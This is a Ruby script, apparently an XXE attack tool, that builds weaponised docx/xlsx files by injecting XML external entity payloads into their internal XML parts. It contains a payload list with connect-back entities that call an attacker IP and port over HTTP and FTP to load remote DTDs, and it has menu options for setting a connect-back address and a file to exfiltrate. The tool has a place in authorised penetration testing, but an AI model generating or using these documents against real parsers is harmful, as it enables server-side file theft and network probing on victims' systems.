# encoding: ASCII-8BIT

require 'zipruby'
require 'highline/import'
require 'highline'
require 'fileutils'

# Global variables, these can be hardcoded to save time
@input_file = ""
@ip = ""
@payload_file = ""
@port = ""


def read_payloads()	
	pl = {}
	pl["vanilla_entity"] = '<!DOCTYPE root [<!ENTITY xxe "XE_SUCCESSFUL">]>'
	pl["vanilla_recursive"] = '<!DOCTYPE root [<!ENTITY b "XE_SUCCESSFUL"><!ENTITY xxe "RECURSE &b;&b;&b;&b;">]>'	
	pl["vanilla_parameter"] = '<!DOCTYPE root [<!ENTITY % xxe "test"> %xxe;]>>'
	pl["vanilla_parameter_recursive"] = '<!DOCTYPE root [<!ENTITY % a "PARAMETER"> <!ENTITY % b "RECURSIVE %a;"> %b;]>>'
	pl["parameter_connectback"] = '<!DOCTYPE root [<!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>'
	pl["dbl_parameter_connectback"] = '<!DOCTYPE roota [<!ENTITY % file SYSTEM "http://IP:PORT/a.html"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>'
	pl["rc_parameter_connectback"] = '<!DOCTYPE roota [<!ENTITY % file SYSTEM "http://IP:PORT/a.html"><!ENTITY % a SYSTEM "http://IP:PORT/b.dtd">%a;]>>'
	pl["parameter_connectback_ftp"] = '<!DOCTYPE root [<!ENTITY % a SYSTEM "ftp://IP:PORT/b.dtd">%a;]>>'
	pl["xinclude_root"] = '<root xmlns:xi="http://www.w3.org/2001/XInclude"><xi:include href="file:///IP:PORT/clown.html" parse="text"/></root>'

	return pl
end

def list_files(docx)
	files = []
	Zip::Archive.open(docx, Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries
    
		n.times do |i|
			entry_name = zipfile.get_name(i) # get entry name from archive
			files.push(entry_name)
		end
	end
	return files
end

def select_payload
	ploads = read_payloads()
	payload = ""
	choose do |menu|
		menu.prompt = "Choose XXE payload:"	
		ploads.each do |pload|
			menu.choice pload[0] do payload = pload end
		end
		menu.choice "Print XXE Payload Details" do 
			ploads.each do |pload|
				p pload
			end
			main
			exit
		end
		
	end
	if payload[1] =~ /IP/ and @ip.size == 0
		@ip = ask("Payload Requires a connect back IP:")
		payload[1] = payload[1].gsub("IP",@ip)	
	end
	if payload[1] =~ /FILE/ and @payload_file.size == 0
		@file_payload = ask("Payload Requires a file to check for:")	
		payload[1] = payload[1].gsub("FILE",@file_payload)	
	end
	if payload[1] =~ /PORT/ and @port.size == 0
		@port = ask("Payload allows for connect back port to be specified:")	
		payload[1] = payload[1].gsub("PORT",@port)	
	end
	
	return payload
end

def payload(document,payload)
	# insert the payload, TODO this should be refactored
	document = document.gsub('<?xml version="1.0" encoding="UTF-8"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@ip).gsub('PORT',@port).gsub('FILE',@payload_file)}""")	
	document = document.gsub('<?xml version="1.0" encoding="UTF-8" standalone="yes"?>',"""<?xml version=\"1.0\" encoding=\"UTF-8\"?>#{payload.gsub('IP',@ip).gsub('PORT',@port).gsub('FILE',@payload_file)}""")
	return document
end

def add_payload(name,payloadx)
	document = ""
	# Read in the XLSX and grab the document.xml
	Zip::Archive.open(@input_file, Zip::CREATE) do |zipfile|
		zipfile.fopen(name) do |f|
			document = f.read # read entry content
		end
	end
	docx_xml = payload(document,payloadx[1])

	# get file ext
	ext = @input_file.split(".").last
	nname = "output_#{Time.now.to_i}_#{name.gsub(".","_").gsub("/","_")}"
	rand_file = "./output/#{nname}.#{ext}"

	puts "|+| Creating #{rand_file}"
	FileUtils::copy_file(@input_file,rand_file)
	Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
		zipfile.add_or_replace_buffer(name,
								  docx_xml)
	end
end

def add_payload_all(fz,payload)
	fz.each do |name|
		add_payload(name, payload)
	end		 
end

def choose_file(docx)
	fz = list_files(docx)
	payload = select_payload
	puts "|+| #{payload} selected"
	choose do |menu|
		menu.prompt = "Choose File to insert XXE into:"
		menu.choice "Insert Into All Files Creating Multiple OOXML Files (Recommended)" do add_payload_all(fz, payload) end
		menu.choice "Insert Into All Files In Same OOXML File" do add_payload_all(fz, payload) end
		fz.each do |name|
			menu.choice name do add_payload(name, payload) end
		end		 
	end
end

def find_string
	if(@input_file.size > 0)
		puts "|+| Using #{@input_file}"
	else
		docx = ask("Please Enter Input File ('Q' to go back):")
		if docx.downcase == "Q"
			return
		else
			# check if file exists
			if File.file?(docx)		
				puts "|+| #{docx} Loaded"
			else
				puts "|!| #{docx} cannot be found."
			end
		end
	end
	payloadx = select_payload
	
	puts "|+| Checking for § in the document..."

	targets = []
	Zip::Archive.open(@input_file, Zip::CREATE) do |zipfile|
		n = zipfile.num_files # gather entries
    
		n.times do |i|
			nm = zipfile.get_name(i)
			zipfile.fopen(nm) do |f|
				document = f.read # read entry content
				if document =~ /§/
					puts "|+| Found § in #{nm}, replacing with &xxe;"
					targets.push(nm)
				end
			end
		end
	end
	
	if targets.size == 0 
		puts "|-| Could not find § in document, please verify."
		return
	end
	
	targets.each do |target|
		document = ""
		# Read in the XLSX and grab the document.xml
		Zip::Archive.open(@input_file, Zip::CREATE) do |zipfile|
			zipfile.fopen(target) do |f|
				document = f.read # read entry content
			end
		end
		docx_xml = payload(document,payloadx[1])
		
		# replace string
		docx_xml = docx_xml.gsub("§","&xxe;")

		# get file ext
		ext = @input_file.split(".").last
		nname = "#{Time.now.to_i}_#{target.gsub(".","_").gsub("/","_")}"
		rand_file = "./output/#{nname}.#{ext}"

		puts "|+| Creating #{rand_file}"
		FileUtils::copy_file(@input_file,rand_file)
		Zip::Archive.open(rand_file, Zip::CREATE) do |zipfile|
			zipfile.add_or_replace_buffer(target,
									  docx_xml)
		end
	end
end

def list_files_menu
	if(@input_file.size > 0)
		puts "|+| Using #{@input_file}"
		choose_file(@input_file)
	else
		docx = ask("Please Enter Input File ('Q' to go back):")
		if docx.downcase == "Q"
			return
		else
			docx = @input_file.size == 0 ? docx : @input_file
			@input_file = docx
			
			# check if file exists
			if File.file?(docx)		
				choose_file(docx)
				puts "|+| #{docx} Loaded"
			else
				puts "|!| #{docx} cannot be found."
			end
		end
	end
end

def set_globals
	choose do |menu|
		menu.prompt = "Set Global Variables (q to return):"
		menu.choice "Set Connect Back IP" do
			@ip = ask("IP:")
		end
		menu.choice "OXML File To Inject Into" do
			@input_file = ask("Input File:")
		end
		menu.choice "Payload File to Exfiltrate" do
			@payload_file = ask("Payload File:")
		end
		menu.choice "Connect Back Port" do
			@port = ask("Port:")
		end
		menu.choice "Print Globals" do
			puts "\t|+| IP: #{@ip}"
			puts "\t|+| PORT: #{@port}"
			puts "\t|+| INPUT FILE: #{@input_file}"
			puts "\t|+| PAYLOAD FILE: #{@payload_file}"
		end
		menu.hidden "q" do
			return
		end
	end
end

def main
	while(true)
		puts "\n"
		choose do |menu|
			menu.prompt = "Select Options"
			menu.choice "Build XE Document" do list_files_menu end
			menu.choice "Build XE Document and Replace Strings" do find_string end
			menu.choice "Set Global Variables" do set_globals end
			menu.choice "Quit" do exit end
		end
	end
end

main